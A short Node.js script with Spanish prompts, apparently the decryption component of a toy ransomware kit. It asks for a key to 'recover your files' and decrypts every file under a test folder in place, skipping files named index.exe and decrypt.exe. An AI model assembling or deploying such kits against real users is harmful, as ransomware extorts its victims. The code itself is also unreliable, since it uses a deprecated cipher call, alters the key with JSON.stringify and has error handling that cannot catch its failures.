fs = require('fs'), crypto = require('crypto');
crypto = require('crypto'), recursive = require("recursive-readdir"), readline = require('readline');
process.stdin.resume();

rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
})

rl.question('Para recuperar sus archivos, ingrese una clave a continuación :) (Click derecho para pegar)\n', answer => {
  try {
    decrypt = (text, key) => {
      const decipher = crypto.createDecipher('aes256', key)
      let decrypted = decipher.update(text, 'hex', 'utf8')
      decrypted += decipher.final('utf8')
      return decrypted
    }
    // Reemplace './test' con lo que quiera
      recursive("./test", ['index.exe', 'decrypt.exe'] , (err, files) => {
        for(let i of files){
          fs.writeFileSync(i, decrypt(fs.readFileSync(i, 'utf8'), JSON.stringify(answer)))
      }});
    }
    catch(e) {
      console.log('La clave no coincide, lo siento :(');
    }
    console.log(`¡Que tenga un lindo día!. Presione Ctrl + C para salir`);
})
